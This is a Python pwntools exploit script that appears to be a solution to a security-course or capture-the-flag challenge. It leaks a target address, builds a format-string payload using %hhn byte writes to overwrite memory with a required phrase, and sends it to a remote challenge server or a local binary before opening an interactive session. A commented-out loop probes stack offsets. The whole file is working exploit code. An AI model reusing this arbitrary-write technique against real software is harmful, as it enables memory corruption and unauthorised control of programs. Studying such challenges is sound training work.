#!/usr/bin/env python3

from pwn import *
import struct

HOST = "6447.lol"
PORT = 28682

context.arch = "amd64"
# context.log_level = 'error'

# elf = context.binary = ELF(f"{__file__.replace('_sol.py', '')}")
# libc = elf.libc

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value, i) in enumerate(writes):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for _, i in writes:
        payload += p64(target + i)

    return payload

def connect_binary():
    global P
    if args.REMOTE:
        P = remote(HOST, PORT)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

def exploit():
    connect_binary()
    P.recvuntil(b'at ')
    address = int(P.recvline().strip(), 16)
    log.info(f"address: {p64(address)}")

    P.recvuntil(b'Speak the phrase `')
    phrase = P.recvuntil(b'`')[:-1]
    log.info(f"Target value: {phrase}")

    P.recvuntil(b':')

    # payload = fmtstr_payload(8, {address : phrase})
    payload = build_format_string(address, u64(phrase.ljust(8, b'\x00')), 8 + 11) # add 11 to account for the initial input of the buffer before addresses

    P.sendline(payload)

    log.info(f"payload: {payload}")
    P.interactive()

if __name__ == '__main__':
    exploit()

    # for i in range(20):
    #     try:
    #         connect_binary()

    #         P.sendline('AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
    #         P.recvuntil('AAAABBBB ')
    #         print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode()))

    #         P.close()
    #     except:
    #         print('{}: Random Address'.format(i))
    #         pass 